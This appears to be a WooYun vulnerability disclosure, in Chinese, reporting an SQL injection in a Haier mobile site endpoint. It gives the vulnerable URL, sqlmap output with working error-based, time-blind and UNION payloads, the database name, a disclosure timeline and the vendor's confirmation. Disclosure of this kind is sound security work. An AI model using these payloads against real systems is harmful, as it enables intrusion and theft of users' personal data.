wybug_title: 海尔集团某处sql注入漏洞（300万账户信息及170万地址信息）
wybug_detail:
漏洞详情 披露状态：   									2016-03-30：	细节已通知厂商并且等待厂商处理中									2016-03-30：	厂商已经确认，细节仅向厂商公开									2016-04-09：	细节向核心白帽子及相关领域专家公开									2016-04-19：	细节向普通白帽子公开									2016-04-29：	细节向实习白帽子公开									2016-05-14：	细节向公众公开  简要描述：  详细说明：  
http://m.rrs.com/snaplb/wikiManage/queryWikiContentList?moduleId=3&oneLevel=1&pageSize=9



sqlmap resumed the following injection point(s) from stored session:---Parameter: oneLevel (GET)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: moduleId=3&oneLevel=1' AND (SELECT 7231 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(7231=7231,1))),0x716b6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bRtQ'='bRtQ&pageSize=9    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: moduleId=3&oneLevel=1' AND (SELECT * FROM (SELECT(SLEEP(5)))rFYo) AND 'Ksio'='Ksio&pageSize=9    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: moduleId=3&oneLevel=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716b71,0x525649737362764b4270,0x716b6a7071),NULL,NULL-- &pageSize=9---back-end DBMS: MySQL 5.0Database: snap_haier[198 wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-30 09:57 厂商回复： 感谢白帽子的测试与提醒，已安排人员紧急处理 最新状态： 暂无
